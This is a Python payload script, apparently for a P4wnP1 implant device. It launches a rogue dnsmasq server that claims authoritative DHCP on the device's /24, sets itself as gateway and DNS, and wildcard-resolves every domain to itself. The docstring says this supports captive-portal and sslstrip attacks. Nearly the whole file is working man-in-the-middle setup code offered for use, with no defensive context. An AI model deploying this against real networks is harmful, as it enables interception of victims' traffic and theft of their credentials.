#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Launch a rogue dnsmasq bound to the device's primary interface & /24 network.

- Gateway/DNS is the device's current primary IP (usb0 > eth0 > wlan0 > any)
- DHCP range auto-picked within that /24 (safe offsets)
- Wildcard DNS (address=/#/<gw>) for captive-portal/sslstrip flows

Stops any previous instance via PID file. Writes confs to /run/p4wnp1/.
"""

import ipaddress
import os
import signal
import subprocess
import sys
from pathlib import Path
from payloads.lib.netutil import primary_ip, primary_iface

RUNDIR = Path("/run/p4wnp1")
RUNDIR.mkdir(parents=True, exist_ok=True)
CONF = RUNDIR / "dnsmasq-rogue.conf"
PIDF = RUNDIR / "dnsmasq-rogue.pid"
LEASES = RUNDIR / "dnsmasq-rogue.leases"
LOGF = RUNDIR / "dnsmasq-rogue.log"

def stop_if_running():
    if PIDF.exists():
        try:
            pid = int(PIDF.read_text().strip())
            os.kill(pid, signal.SIGTERM)
        except Exception:
            pass
        try:
            PIDF.unlink()
        except Exception:
            pass

def compute_net(ipstr: str):
    iface = primary_iface() or "usb0"
    iface_cidr = ipaddress.ip_interface(f"{ipstr}/24")  # assume /24 for gadget setups
    net = iface_cidr.network
    hosts = list(net.hosts())
    # pick a conservative slice for DHCP
    start = hosts[10] if len(hosts) > 120 else hosts[max(2, len(hosts)//16)]
    end   = hosts[100] if len(hosts) > 140 else hosts[min(len(hosts)-2, (len(hosts)//16)*8)]
    return iface, str(iface_cidr.ip), str(start), str(end), str(net.network_address), str(net.broadcast_address)

def write_conf(iface: str, gw: str, dhcp_start: str, dhcp_end: str):
    contents = f"""\
bind-interfaces
interface={iface}
no-resolv
log-queries
log-facility={LOGF}
dhcp-authoritative
dhcp-leasefile={LEASES}
dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{gw}
dhcp-option=6,{gw}
address=/#/{gw}
"""
    CONF.write_text(contents)

def start_dnsmasq():
    cmd = [
        "/usr/sbin/dnsmasq",
        "--conf-file=" + str(CONF),
        "--pid-file=" + str(PIDF),
        "--keep-in-foreground",
    ]
    # Run in foreground so payload runner captures exit; daemonize by removing keep-in-foreground.
    print(f"[dnsmasq] launching: {' '.join(cmd)}")
    p = subprocess.Popen(cmd)
    # For long-running interactive mode, you might keep p.wait()
    # Here we return immediately but print basics
    print(f"[dnsmasq] pid={p.pid}  conf={CONF}  leases={LEASES}")
    return 0

def main():
    gw = primary_ip()
    if not gw:
        print("[-] Could not determine primary IP")
        return 1
    iface, gw_ip, dhcp_start, dhcp_end, net_addr, bcast = compute_net(gw)
    print(f"[+] Interface: {iface}")
    print(f"[+] Gateway:   {gw_ip}")
    print(f"[+] Subnet:    {net_addr}/24  (broadcast {bcast})")
    print(f"[+] DHCP:      {dhcp_start} – {dhcp_end}")

    stop_if_running()
    write_conf(iface, gw_ip, dhcp_start, dhcp_end)
    return start_dnsmasq()

if __name__ == "__main__":
    sys.exit(main())
